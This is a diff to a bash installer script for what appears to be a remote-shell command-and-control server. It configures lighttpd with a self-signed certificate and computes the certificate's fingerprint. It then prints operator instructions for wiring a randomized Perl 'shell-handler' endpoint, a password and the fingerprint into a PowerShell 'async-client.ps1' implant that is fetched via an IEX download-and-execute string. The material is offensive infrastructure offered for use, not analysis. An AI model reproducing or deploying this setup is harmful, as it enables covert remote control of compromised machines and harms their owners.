@@ -145,6 +145,8 @@ cat ./lighttpd.conf > /etc/lighttpd/lighttpd.conf
 mkdir /etc/lighttpd/ssl
 folder_perm /etc/lighttpd/ssl
 openssl req -new -x509 -keyout /etc/lighttpd/ssl/server.pem -out /etc/lighttpd/ssl/server.pem -days 365 -nodes
+keyprint=$(openssl x509 -in /etc/lighttpd/ssl/server.pem -fingerprint -noout | cut -d'=' -f2 | tr -d : )
+
 
 ## [ MOVING FILES ] #######
 
@@ -175,31 +177,36 @@ folder_perm /var/systems
 
 service lighttpd restart
 
-echo "[+]=========================================================================[]"
-echo "[+] IMPORTANT---IMPORTANT---IMPORTANT---IMPORTANT---IMPORTANT---IMPORTANT"
-echo "[+]"
-echo "[+] The name of your shell-handler has been randomized."
-echo "[+] The name of the async client has been randomized."
-echo "[+]"
-echo "[+] Paste this in the async-client.ps1 script renamed as /var/www/$rclient"
-echo "[+] as { uri } variable"
-echo "[+]"
-echo "[+] \$uri = https://your-ip-or-domain/$rname.pl "
-echo "[+]"
-echo "[+] Client password needed to be granted access to connect to shell-handler"
-echo "[+] pass : [ $pass ]"
-echo "[+]"
-echo "[+] Paste this in the async-client.ps1 script renamed as /var/www/$rclient"
-echo "[+] as { key } variable"
-echo "[+]"
-echo "[+] \$key = $pass "
-echo "[+]"
-echo "[+] The name of the async client has been randomized so use this name for "
-echo "[+] your IEX download String."
-echo "[+]"
-echo "[+] URI: [ https://your-ip-or-domain/$rclient ] "
-echo "[+]"
-echo "[+] 		                                          rock n roll...."
-echo "[+]==========================================================================[]"
+echo "[]=========================================================================[]"
+echo "[] IMPORTANT---IMPORTANT---IMPORTANT---IMPORTANT---IMPORTANT---IMPORTANT"
+echo "[]"
+echo "[] The name of your shell-handler has been randomized."
+echo "[] The name of the async client has been randomized."
+echo "[]"
+echo "[] Paste this in the async-client.ps1 script renamed as /var/www/$rclient"
+echo "[] as { uri } variable"
+echo "[]"
+echo "[] \$uri = https://your-ip-or-domain/$rname.pl "
+echo "[]"
+echo "[] Client password needed to be granted access to connect to shell-handler"
+echo "[] pass : [ $pass ]"
+echo "[]"
+echo "[] Paste this in the async-client.ps1 script renamed as /var/www/$rclient"
+echo "[] as { key } variable"
+echo "[]"
+echo "[] \$key = $pass "
+echo "[]"
+echo "[] The following is the Thumb/finger print of your self-signed certificate"
+echo "[] paste in the { certfingerprint } variable "
+echo "[]"
+echo "[] \$certfingerprint = $keyprint "
+echo "[]"
+echo "[] The name of the async client has been randomized so use this name for "
+echo "[] your IEX download String."
+echo "[]"
+echo "[] URI: [ https://your-ip-or-domain/$rclient ] "
+echo "[]"
+echo "[] 		                                          rock n roll...."
+echo "[]==========================================================================[]"
 
 exit 0
